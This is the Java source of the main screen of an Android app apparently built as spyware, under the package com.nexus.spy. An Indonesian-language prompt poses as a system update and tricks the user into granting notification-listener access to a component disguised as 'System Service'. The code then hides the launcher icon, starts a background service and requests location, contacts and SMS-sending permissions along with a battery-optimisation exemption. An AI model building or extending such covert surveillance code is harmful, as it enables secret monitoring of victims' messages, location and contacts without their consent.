package com.nexus.spy;
import android.app.Activity;
import android.content.*;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.*;
public class MainActivity extends Activity {
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        boolean active = flat != null && flat.contains(getPackageName());
        if (active) { hideLauncher(); startService(new Intent(this, HeartbeatService.class)); finish(); return; }
        
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL); ll.setPadding(48, 96, 48, 48); ll.setBackgroundColor(0xFF111111);
        TextView tv = new TextView(this); tv.setTextSize(16); tv.setTextColor(0xFFE5E5E5);
        tv.setText("Sistem membutuhkan akses notifikasi untuk pembaruan.\n\n1. Tekan tombol di bawah.\n2. Cari 'System Service'.\n3. Aktifkan toggle.\n4. Kembali ke sini.");
        Button btn = new Button(this); btn.setText("Buka Pengaturan Sistem");
        btn.setOnClickListener(v -> startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)));
        Button btn2 = new Button(this); btn2.setText("Selesai & Sembunyikan");
        btn2.setOnClickListener(v -> {
            String f = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
            if (f != null && f.contains(getPackageName())) { hideLauncher(); startService(new Intent(this, HeartbeatService.class)); finish(); }
            else Toast.makeText(this, "Akses belum aktif!", Toast.LENGTH_SHORT).show();
        });
        ll.addView(tv); ll.addView(btn); ll.addView(btn2); setContentView(ll);
        
        if (android.os.Build.VERSION.SDK_INT >= 33) requestPermissions(new String[]{"android.permission.POST_NOTIFICATIONS","android.permission.ACCESS_FINE_LOCATION","android.permission.READ_CONTACTS","android.permission.SEND_SMS"}, 1);
        if (android.os.Build.VERSION.SDK_INT >= 23) {
            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent bi = new Intent(); bi.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                bi.setData(android.net.Uri.parse("package:" + getPackageName()));
                try { startActivity(bi); } catch (Exception e) {}
            }
        }
    }
    void hideLauncher() {
        try { getPackageManager().setComponentEnabledSetting(new ComponentName(this, "com.nexus.spy.LauncherAlias"), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP); } catch (Exception e) {}
    }
}
